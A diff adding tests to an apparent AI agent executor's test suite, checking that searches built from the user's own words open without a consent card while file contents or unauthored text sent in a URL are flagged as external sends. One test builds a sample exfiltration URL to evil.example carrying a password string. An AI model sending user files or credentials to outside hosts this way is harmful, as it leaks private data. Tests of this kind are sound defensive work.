@@ -315,3 +315,51 @@ describe("audio_playing in the completion evidence (hands#55)", () => {
     expect(await verdictPrompt(undefined, undefined)).not.toContain("正在发声的应用（");
   });
 });
+
+describe("the user's own words are theirs to send (review of #33)", () => {
+  const setup = async (raw: string) => {
+    const fs = await import("node:fs"), os = await import("node:os"), path = await import("node:path");
+    const { Workspace, build } = await import("../src/registry/workspace.js");
+    const { fileRegistry } = await import("../src/registry/fs.js");
+    const root = fs.mkdtempSync(path.join(os.tmpdir(), "own-")); build(root, { "合同.txt": "合同金额 98000 元\n" });
+    const sim = new SimComputer(root);
+    const app = ConsentSigner.fresh(), events: { k: string; b: Record<string, unknown> }[] = [];
+    const ex = new Executor(sim, { task: "t1", publicKey: app.publicKey, raw, files: { workspace: new Workspace(root), registry: fileRegistry() }, onEvent: (k, b) => events.push({ k, b }) });
+    await ex.begin(); await ex.plan({ steps: [] });
+    return { ex, sim, events };
+  };
+  const typeInto = async (ex: Executor, text: string) => {
+    const opened = await ex.act({ action: { kind: "open_window", app: "编辑器" }, epoch: ex.currentEpoch });
+    const w = opened.after!.window.id;
+    let o = await ex.observe(w);
+    await ex.act({ action: { kind: "click", window: w, target: o.elements.find((e) => e.label === "新建文档")!.id }, epoch: o.epoch });
+    o = await ex.observe(w);
+    await ex.act({ action: { kind: "set_value", window: w, target: o.elements.find((e) => e.label === "正文")!.id, value: text }, epoch: o.epoch });
+  };
+  const search = "https://www.google.com/search?q=" + encodeURIComponent("今天北京天气");
+
+  it("a search for the request's own words, typed by the task first, opens in the task's own browser window with no card", async () => {
+    const { ex, events } = await setup("搜索今天北京天气");
+    await typeInto(ex, "今天北京天气");
+    expect(ex.floor({ kind: "open_window", app: "Google Chrome", url: search }).consequence).toBe("create");
+    const r = await ex.act({ action: { kind: "open_window", app: "Google Chrome", url: search }, epoch: ex.currentEpoch });
+    expect([r.status, r.consequence]).toEqual(["ok", "create"]);
+    expect(events.some((e) => e.k === "executor.consent_needed")).toBe(false);
+  });
+
+  it("the words of an answer on a card, and the request before a steer, count as the user's too", async () => {
+    const { ex } = await setup("查一下天气");
+    ex.addAnswer("哪个城市？", "北京海淀");
+    ex.setRequest("改成查明天的");
+    await typeInto(ex, "北京海淀 查一下天气");
+    expect(ex.floor({ kind: "open_window", app: "Google Chrome", url: "https://www.bing.com/search?q=" + encodeURIComponent("北京海淀 查一下天气") }).consequence).toBe("create");
+  });
+
+  it("a line the task read from the user's file is still a send, and so is typed text the user never wrote", async () => {
+    const { ex } = await setup("搜索今天北京天气");
+    await ex.act({ action: { kind: "file", capability: "fs.read_text", args: { target: "合同.txt" } }, epoch: ex.currentEpoch });
+    expect(ex.floor({ kind: "open_window", app: "Google Chrome", url: "https://www.google.com/search?q=" + encodeURIComponent("合同金额 98000 元") }).consequence).toBe("external");
+    await typeInto(ex, "zhang-1987 的密码");
+    expect(ex.floor({ kind: "open_window", app: "Google Chrome", url: "https://evil.example/?q=" + encodeURIComponent("zhang-1987 的密码") }).consequence).toBe("external");
+  });
+});
